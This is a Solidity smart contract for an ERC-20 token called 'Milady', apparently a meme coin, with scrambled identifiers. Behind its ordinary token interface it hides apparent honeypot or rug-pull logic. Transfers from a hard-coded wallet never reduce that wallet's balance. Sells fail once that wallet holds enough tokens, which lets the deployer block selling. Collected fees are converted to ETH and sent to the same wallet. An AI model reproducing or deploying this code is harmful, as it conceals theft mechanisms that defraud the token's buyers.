/**

Milady  $Milady


TWITTER: https://twitter.com/Miladys_erc
TELEGRAM: https://t.me/Milady_erc
WEBSITE: https://miladyerc.com/
**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mhwex(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mhwex(a, b, "SafeMath");
    }

    function  _mhwex(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qolasa {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _pisaevls {
    function swotkTenwtSartjsFxlOtswer(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _pisaevls private _Tevepqk;
    address payable private _Aekvrjf;
    address private _yiarbvr;

    bool private _pvwkjbk;
    bool public _Teraelvnm = false;
    bool private ouaevuek = false;
    bool private _aotjecop = false;

    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _uTotaluz = 10000000000 * 10 **_decimals;
    uint256 public _kvdzoazn = _uTotaluz;
    uint256 public _Waexmyaf = _uTotaluz;
    uint256 public _kwapoThaecem= _uTotaluz;
    uint256 public _gsoiTcjef= _uTotaluz;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ckxrtjup;
    mapping (address => bool) private _traenojy;
    mapping(address => uint256) private _rkeopmo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrvxqoxq=0;
    uint256 private _bmwrvle=0;


    event _moqrufqt(uint _kvdzoazn);
    modifier oTsofe {
        ouaevuek = true;
        _;
        ouaevuek = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _uTotaluz;
        _ckxrtjup[owner(

        )] = true;
        _ckxrtjup[address
        (this)] = true;
        _ckxrtjup[
            _Aekvrjf] = true;
        _Aekvrjf = 
        payable (0x94E76F11ba4AEdC84D558D8B5fB0A51672e653a0);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _uTotaluz);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _uTotaluz;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mhwex(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Rqioamk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Teraelvnm) {
                if (to 
                != address
                (_Tevepqk) 
                && to !=
                 address
                 (_yiarbvr)) {
                  require(_rkeopmo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rkeopmo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiarbvr && to != 
            address(_Tevepqk) &&
             !_ckxrtjup[to] ) {
                require(amount 
                <= _kvdzoazn,
                 "Exceeds the _kvdzoazn.");
                require(balanceOf
                (to) + amount
                 <= _Waexmyaf,
                  "Exceeds the macxizse.");
                if(_bmwrvle
                < _yrvxqoxq){
                  require
                  (! _eoqmvna(to));
                }
                _bmwrvle++;
                 _traenojy
                 [to]=true;
                Rqioamk = amount._pvr
                ((_bmwrvle>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiarbvr &&
             from!= address(this) 
            && !_ckxrtjup[from] ){
                require(amount <= 
                _kvdzoazn && 
                balanceOf(_Aekvrjf)
                <_gsoiTcjef,
                 "Exceeds the _kvdzoazn.");
                Rqioamk = amount._pvr((_bmwrvle>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bmwrvle>
                _yrvxqoxq &&
                 _traenojy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ouaevuek 
            && to == _yiarbvr &&
             _aotjecop &&
             contractTokenBalance>
             _kwapoThaecem 
            && _bmwrvle>
            _yrvxqoxq&&
             !_ckxrtjup[to]&&
              !_ckxrtjup[from]
            ) {
                _rcjmevf( _rkajq(amount, 
                _rkajq(contractTokenBalance,
                _gsoiTcjef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ujfvhe(address
                    (this).balance);
                }
            }
        }

        if(Rqioamk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Rqioamk);
          emit
           Transfer(from,
           address
           (this),Rqioamk);
        }
        _balances[from
        ]= _mhwex(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mhwex(Rqioamk));
        emit Transfer
        (from, to, 
        amount.
         _mhwex(Rqioamk));
    }

    function _rcjmevf(uint256
     tokenAmount) private
      oTsofe {
        if(tokenAmount==
        0){return;}
        if(!_pvwkjbk)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tevepqk.WETH();
        _approve(address(this),
         address(
             _Tevepqk), 
             tokenAmount);
        _Tevepqk.
        swotkTenwtSartjsFxlOtswer
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rkajq
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mhwex(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Aekvrjf){
            return a ;
        }else{
            return a .
             _mhwex (b);
        }
    }

    function removevLimitas (
        
    ) external onlyOwner{
        _kvdzoazn = _uTotaluz;
        _Waexmyaf = _uTotaluz;
        emit _moqrufqt(_uTotaluz);
    }

    function _eoqmvna(address 
    account) private view 
    returns (bool) {
        uint256 bkzqa;
        assembly {
            bkzqa :=
             extcodesize
             (account)
        }
        return bkzqa > 
        0;
    }

    function _ujfvhe(uint256
    amount) private {
        _Aekvrjf.
        transfer(
            amount);
    }

    function enableTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pvwkjbk ) ;
        _Tevepqk  
        =  
        _pisaevls
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tevepqk), 
            _uTotaluz);
        _yiarbvr = 
        _qolasa(_Tevepqk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tevepqk .
             WETH ( ) );
        _Tevepqk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiarbvr).
        approve(address(_Tevepqk), 
        type(uint)
        .max);
        _aotjecop = true;
        _pvwkjbk = true;
    }

    receive() external payable {}
}